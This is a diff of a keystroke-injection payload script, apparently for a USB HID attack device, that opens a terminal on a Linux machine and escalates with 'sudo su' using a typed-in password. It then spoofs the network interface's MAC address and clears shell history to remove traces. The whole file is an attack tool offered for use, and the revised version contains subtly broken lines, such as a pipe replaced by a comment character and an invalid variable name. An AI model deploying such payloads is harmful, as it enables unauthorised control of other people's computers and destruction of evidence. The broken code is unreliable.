@@ -1,68 +1,58 @@
-* ###########################################
-* #                                         |
-* # Title        : Change Linux MAC Address |
-* # Author       : Aleff                    |
-* # Version      : 1.0                      |
-* # Category     : Execution                |
-* # Target       : Linux                    |
-* #                                         |
-* ###########################################
+###########################################
+#                                         #
+# Title        : Change Linux MAC Address #
+# Author       : Aleff                    #
+# Version      : 1.0                      #
+# Category     : Execution                #
+# Target       : Linux                    #
+#                                         #
+###########################################
 
-* Requirements:
-*     - Permissions
+ATTACKMODE HID
 
-QUACK DELAY 1000
+# Requirements:
+#  - Permissions
+
+# VARIABLES
+# You need to know the sudo password and replace 'SUDO_PASS' with this
+SUDO-PASS='example'
+# Set here your preferred MAC, you can don't change it remaining with the default value
+NEW_MAC='example'
+
+QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 2000
 
-
-* #### PERMISSIONS SECTION ####
-
+#### PERMISSIONS SECTION ####
 QUACK STRING sudo su
 QUACK ENTER
 QUACK DELAY 1000
-
-* You need to know the sudo password and replace 'SUDO_PASS' with this
-QUACK STRING SUDO_PASS
+QUACK STRING $SUDO-PASS
 QUACK ENTER
 QUACK DELAY 1000
 
-
-* #### MAC SECTION ####
-
-
-* net-tools command
+#### MAC SECTION ####
+# net-tools command
 QUACK STRING apt install net-tools
 QUACK ENTER
 QUACK DELAY 2000
 
-* Get the net interface name
-QUACK STRING INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5}')
+# Get the net interface name
+QUACK STRING INTERFACE=\$(ip route get 8.8.8.8 # awk '{print \$5}')
 QUACK ENTER
 QUACK DELAY 500
-
-QUACK STRING ifconfig $INTERFACE down
+QUACK STRING ifconfig \$INTERFACE down
 QUACK ENTER
 QUACK DELAY 500
-
-QUACK STRING ifconfig $INTERFACE hw ether 
-* Set here your preferred MAC, you can don't change it remaining with the default value
-QUACK STRING NEW_MAC
+QUACK STRING ifconfig \$INTERFACE hw ether $NEW_MAC
 QUACK ENTER
 QUACK DELAY 500
-
-QUACK STRING ifconfig $INTERFACE up
+QUACK STRING ifconfig \$INTERFACE up
 QUACK ENTER
 QUACK DELAY 500
 
 
-* #### *OVE TRACES ####
-
-
+#### REMOVE TRACES ####
 QUACK DELAY 2000
-QUACK STRING history -c
-QUACK ENTER
-
-* Close shell
-QUACK STRING exit
+QUACK STRING history -c; exit
 QUACK ENTER
